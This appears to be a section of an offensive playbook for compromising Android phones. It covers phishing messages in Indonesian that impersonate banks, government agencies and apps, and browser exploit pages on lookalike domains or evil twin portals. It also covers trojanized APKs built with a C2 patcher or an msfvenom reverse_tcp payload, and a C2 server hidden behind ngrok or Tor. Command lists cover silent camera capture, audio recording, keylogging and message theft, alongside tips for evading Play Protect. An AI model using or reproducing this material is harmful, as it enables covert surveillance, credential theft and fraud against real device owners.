# Phase 7: Social Engineering & APK/Browser Exploit Delivery

**When:** Pre-device access. No CVEs or network exploits applicable. Need to deliver a trojanized APK or browser exploit URL to the target device via social engineering.

## Two Delivery Paths

| Path | Trigger | Requires | Success Rate | Forensic Risk |
|------|---------|----------|-------------|---------------|
| **APK Delivery** | Target downloads + installs APK | Social engineering to convince install | Medium | App install log visible |
| **Browser Exploit URL** | Target clicks link in Firefox/Chrome | Browser 0-day or known CVE | High (one click) | Only URL in browser history |

**Browser exploit URL is the preferred path when available** — no install required, no permission prompts, single click to full compromise. This is the IonStack (CVE-2026-43499) pattern: send malicious URL → Firefox renderer RCE → kernel exploit → root.

## Path A: Browser Exploit URL (Preferred)

### The IonStack Pattern

CVE-2026-43499 demonstrated the most powerful delivery vector on Android: **a single URL click gives full device control**:

```
Target receives URL (SMS/WhatsApp/email)
  → Target clicks URL in Firefox
  → Firefox renderer process RCE (browser 0-day)
  → Sandbox escape (IPC/mojo vulnerability)
  → Native code execution in untrusted_app context
  → Kernel exploit triggers (futex PI + pipe corruption → physical R/W)
  → Credential patching (uid=0, SELinux disable)
  → Full root + su persistence
```

### Delivering the URL

Use the exact same social engineering from the APK delivery persona table (Section "Build the Persona"), but instead of APK download, send a URL:

**SMS Template:**
```
[NAME], seseorang mencoba login ke akun [SERVICE] Anda dari [CITY].
Verifikasi segera: [SHORT_URL]
```

**WhatsApp Template:**
```
Pak/Bu [NAME], dokumen pengadilan untuk kasus #[NUMBER] sudah tersedia.
Lihat di sini: [URL]
Batas waktu 24 jam.
```

**Email Template:**
```
Subject: Undangan Meeting — [TOPIC]

Bapak/Ibu [NAME],

Berikut link meeting hari ini pukul [TIME]:
[URL]

Password: [RANDOM]

Salam,
[Nama Pengirim]
```

### Hosting the Exploit Page

**Option A: Captive Portal (with evil twin WiFi)**
```
scripts/captive_portal/deploy_evil_twin.sh
→ Redirect all HTTP to scripts/captive_portal/browser_exploit.html
→ Page auto-loads exploit JavaScript → Firefox triggers → kernel exploit runs
```

**Option B: Lookalike Domain**
```
bank-mandiri-verification[.]com → hosts exploit page
Page mimics a legitimate service login or document viewer
User clicks link → page loads → exploit fires in background
```

**Option C: Firebase / Netlify / Vercel**
```
https://document-viewer-4f3a2.web.app/
Free hosting, looks legitimate, HTTPS enabled
```

### Browser Exploit Page Template

```html
<!-- scripts/captive_portal/browser_exploit.html -->
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Document Viewer</title>
</head>
<body>
<!-- Legitimate-looking UI to keep target from closing the page -->
<div id="loading">Loading your secure document...</div>
<script>
// Exploit payload — runs in browser renderer process
// Phase 1: Browser RCE (0-day or known CVE for target browser version)
// Phase 2: Sandbox escape via IPC vulnerability
// Phase 3: Download and execute kernel exploit binary
// Phase 4: Kernel exploit runs → root + C2 registration
</script>
</body>
</html>
```

**See `scripts/captive_portal/browser_exploit.html` for production template.**

### Browser Exploit Library

Android browsers are complex targets. For each browser, the attack surface differs:

| Browser | Engine | Key Attack Surface |
|---------|--------|-------------------|
| Firefox | Gecko (GeckoView) | SpiderMonkey JIT, IPC via GeckoView, sandboxed content process |
| Chrome | Blink (Chromium WebView) | V8 JIT, Mojo IPC, site isolation, GPU process |
| Samsung Internet | Blink (Chromium-based) | Same as Chrome + Samsung-specific extensions |
| Brave/Opera/Edge | Blink (Chromium-based) | Same as Chrome |

**Firefox < v151.0.2** has the IonStack 0-days. For current versions, the attack surface shifts to:
- **JavaScript JIT engines:** JIT spray, type confusion, Array/Map optimization bugs
- **DOM/Bindings:** Cross-origin bypass, Blob/File API, WebRTC, WebGL
- **IPC Boundaries:** Mojo (Chromium), GeckoView IPC (Firefox)
- **GPU Process:** WebGL shader compiler, GPU command buffer parsing
- **Network Stack:** HTTP/3, WebSocket, WebRTC data channels
- **Media:** WebCodecs, WebAudio, MediaSource Extensions

**Browser fuzzing targets** — when developing a browser 0-day:
```bash
# Firefox JS engine fuzzing
git clone https://github.com/MozillaSecurity/funfuzz
# or use Domato (DOM fuzzer)
git clone https://github.com/googleprojectzero/domato

# Chromium/V8 fuzzing
# Use Fuzzilli (JS engine fuzzer)
git clone https://github.com/googleprojectzero/fuzzilli
```

## Path B: APK Delivery (Fallback)

<details>
<summary>Click to expand — use when browser exploit is unavailable</summary>

### Strategy Overview

The chain: **Intel → Persona → Contact → Convince → Download → Install → Exfiltrate**

Each step must be context-aware. Generic phishing fails. The target must believe the APK is legitimate, expected, and urgent.

## Step 1: Build the Persona

Based on OSINT from Phase 1, choose the persona that maximizes credibility:

| Target Context | Persona | Trigger |
|---------------|---------|---------|
| Uses e-commerce | "Tokopedia security team" | "Akun Anda ada transaksi mencurigakan" |
| Uses banking app | "BNI/Mandiri/BCA fraud detection" | "Kartu Anda diblokir, install update keamanan" |
| Uses crypto exchange | "Binance compliance" | "Withdrawal tertunda, perlu KYC ulang" |
| Uses ride-hailing | "Gojek/Grab driver safety" | "Update aplikasi untuk verifikasi pengemudi" |
| Uses food delivery | "GoFood partner verification" | "Restoran Anda perlu update sistem" |
| Government employee | "Kominfo / BSSN security notice" | "Update wajib sertifikat elektronik" |
| Business owner | "DJP / Pajak notification" | "e-Filing update required" |
| General public | "Telkomsel / XL provider notice" | "Jaringan 5G upgrade, install paket konfigurasi" |
| Dating app user | "Match from target's city" | "Install app ini biar bisa video call" |

## Step 2: Build the APK

### Option A: Patch Legitimate APK (Highest Success Rate)

```bash
bash scripts/c2/apk_patcher.sh <legitimate.apk> <c2_server_ip> <output.apk>
```

This injects the C2 payload into an existing legitimate app. The app functions normally while exfiltrating data in the background.

**What gets injected:**
- C2 heartbeat (HTTP POST every 60s with device info)
- Accessibility service for persistence and screen monitoring
- Notification listener for message interception
- SMS/call log collection
- Screenshot capture on app open events
- Clipboard monitoring
- Location reporting

### Option B: Build From APK Template

For scenarios where a clean app is needed (e.g., fake utility app):

```bash
# Use Android Studio template then inject C2 payload
bash scripts/c2/apk_patcher.sh template_base.apk <c2_server_ip> output.apk
```

### Option C: Meterpreter / Beerus RAT

For quick deployment when app legitimacy is less critical:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<c2_ip> LPORT=4444 -o payload.apk
```

**Note:** Meterpreter APKs trigger Google Play Protect. For targeted delivery, the social engineering must include instructions to disable Play Protect or the APK must be signed with a developer certificate and avoid known signatures.

### What the APK Collects

Configured via `payload_template.js` (Frida hooks) or native code injection:

1. **Device fingerprint:** IMEI, IMSI, Android ID, device model, OS version, installed apps
2. **Communication:** SMS inbox/sent, call logs, WhatsApp/Telegram databases, notification content
3. **Location:** GPS coordinates (every 5 minutes), WiFi scan results, cell tower info
4. **Media:** Screenshots (on app transitions), camera snapshots (rear camera, silent)
5. **Credentials:** Clipboard contents, autofill data, saved WiFi passwords
6. **Financial:** Installed wallet apps, clipboard crypto addresses, banking app data
7. **Files:** `/sdcard/` documents, downloads, camera photos
8. **Real-time:** Accessibility service captures screen content, keystrokes via input method

## Step 3: Deploy C2 Server

```bash
python3 scripts/c2/c2_server.py --host 0.0.0.0 --port 443 --ssl --output /path/to/exfiltrated
```

The C2 server:
- Listens for heartbeat from implanted devices
- Receives exfiltrated data in chunks
- Sends commands to specific devices
- Logs all connections with timestamps
- Supports ngrok for exposing behind NAT

### Expose C2 via ngrok (field operations)
```bash
ngrok tcp 443
# C2 server becomes accessible at <ngrok_url>:<ngrok_port>
```

### Proxy Chain for Anonymity
```bash
# Route C2 traffic through Tor
torify python3 scripts/c2/c2_server.py --port 443

# Or use proxy chain
proxychains4 python3 scripts/c2/c2_server.py --port 443
```

## Step 4: Craft the Message

### SMS Template (Bahasa Indonesia)
```
[NAMA BANK] FRAUD ALERT: Transaksi Rp4.500.000 dari akun Anda di [LOKASI]. 
Jika bukan Anda, segera install update keamanan: [SHORT_URL] 
Balas STOP untuk berhenti.
```

### WhatsApp Template
```
Selamat siang Bapak/Ibu [NAME],

Kami dari tim keamanan [COMPANY] mendeteksi aktivitas login mencurigakan 
dari perangkat tidak dikenal di [CITY] pada [DATE].

Demi keamanan akun Anda, mohon segera install aplikasi verifikasi resmi kami:
[URL]

Panduan: Setelah install, buka aplikasi dan masukkan kode verifikasi: [CODE]

Jika ada pertanyaan, hubungi kami di [PHONE].

Hormat kami,
Tim Keamanan [COMPANY]
```

### Email Template
- More formal, company-branded HTML
- Include fake case number, urgency language
- Link to APK hosted on a domain similar to the legitimate one (typosquatting)

## Step 5: Host the APK

### Option A: Lookalike Domain
```
bni-keamanan[.]com → hosts fake BNI security page with APK download
```

### Option B: Firebase Hosting
```
https://bank-security-update.web.app/ → looks legitimate, free hosting
```

### Option C: Cloud Storage Direct Link
```
https://drive.google.com/... → direct APK download, bypasses browser warnings
```

### Option D: Captive Portal (paired with Phase 1 evil twin)
```
When target connects to evil twin WiFi → redirected to captive portal → forced APK download
See: scripts/captive_portal/
```

## Step 6: After Installation

Once the target installs and opens the APK:

1. **Immediate exfil:** Device fingerprint, contact list, SMS history
2. **Persistent collection:** Heartbeat every 60s, location every 5min
3. **Command channel:** C2 server sends commands → APK executes
4. **Escalate if possible:** Check for ADB access, root, exploit available CVEs for privilege escalation
5. **Transition to Phase 3:** When enough data exfiltrated, proceed to full forensic extraction methodology

### C2 Commands Reference
```
CMD:SCREENSHOT     → Take screenshot, upload immediately
CMD:CAMERA         → Take silent photo (rear camera), upload
CMD:LOCATION       → Send precise GPS coordinates
CMD:SMS:ALL        → Dump all SMS messages
CMD:WHATSAPP       → Extract WhatsApp database
CMD:CONTACTS       → Dump contact list
CMD:APPS           → List all installed packages
CMD:CLIPBOARD      → Send current clipboard content
CMD:RECORD:30      → Record 30 seconds of audio (mic), upload
CMD:KEYLOG:START   → Begin keystroke logging via accessibility service
CMD:KEYLOG:STOP    → Stop keystroke logging
CMD:UNINSTALL      → Remove payload, delete traces, self-destruct
CMD:SHELL:command  → Execute shell command (if rooted or exploitable)
```

## Operational Security

- **C2 domain:** Use bulletproof hosting or compromised server. Never use personal infrastructure.
- **ngrok/proxy chains:** Essential for field operations. C2 IP must not trace back to investigator.
- **APK signature:** Sign with a valid developer certificate. Unsigned APKs trigger warnings.
- **OPSEC cleanup:** After operation, `CMD:UNINSTALL` removes payload and deletes data directories.
- **Forensic notes:** Document the social engineering chain as part of the investigation methodology.
